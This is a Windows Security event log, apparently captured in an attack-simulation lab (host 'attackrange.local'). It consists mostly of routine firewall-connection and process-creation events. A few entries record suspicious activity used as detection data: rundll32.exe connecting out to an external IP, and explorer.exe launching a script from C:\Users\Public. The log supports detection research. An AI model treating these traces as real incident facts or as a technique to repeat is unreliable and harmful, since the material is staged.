03/01/2021 10:52:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382024
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61256
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382023
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		65336
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:52:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382022
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		65336
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:52:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382021
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		65336
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:52:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382020
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		65336
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:52:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382028
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		65336
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:52:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382027
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		65336
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382026
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55106
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382025
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55106
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:52:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382029
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FC6DEC

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:52:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382034
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60932
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382033
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		51672
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:52:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382032
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		51672
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:52:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382031
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		51672
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:52:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382030
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		51672
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:52:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382036
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		51672
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:52:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382035
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		51672
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382038
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55107
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382037
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55107
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:52:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382040
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2140
	Application Name:	\device\harddiskvolume1\windows\system32\rundll32.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55108
	Destination Address:	34.218.235.219
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382039
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2140
	Application Name:	\device\harddiskvolume1\windows\system32\rundll32.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55108
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:52:55 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382042
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	New Process ID:		0x20a0
	New Process Name:	C:\Windows\System32\dllhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x24c
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\Windows\system32\DllHost.exe /Processid:{49F6E667-6658-4BD1-9DE9-6AF87F9FAF85}

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:52:55 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382041
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	New Process ID:		0x1604
	New Process Name:	C:\Windows\System32\dllhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x24c
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:52:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382043
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59727
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:57 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382045
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1840
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:52:57 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382044
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1698
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x16a4
	Creator Process Name:	C:\Windows\explorer.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:52:59 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382048
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60493
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:59 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382047
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55109
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:52:59 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382046
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55109
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:00 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382051
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2340
	Process Name:	C:\Windows\explorer.exe
	Exit Status:	0x1
03/01/2021 10:53:00 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382050
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	New Process ID:		0x211c
	New Process Name:	C:\Windows\explorer.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x24c
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\Windows\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:00 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382049
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	New Process ID:		0x2340
	New Process Name:	C:\Windows\explorer.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x604
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	explorer.exe C:\Users\Public\Disk0.js

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382058
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		6484
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\bin\splunkd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55110
	Destination Address:	10.0.1.12
	Destination Port:		8089
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382057
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		6484
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\bin\splunkd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55110
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382056
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59535
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382055
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		51181
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382054
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		51181
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382053
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		51181
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382052
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
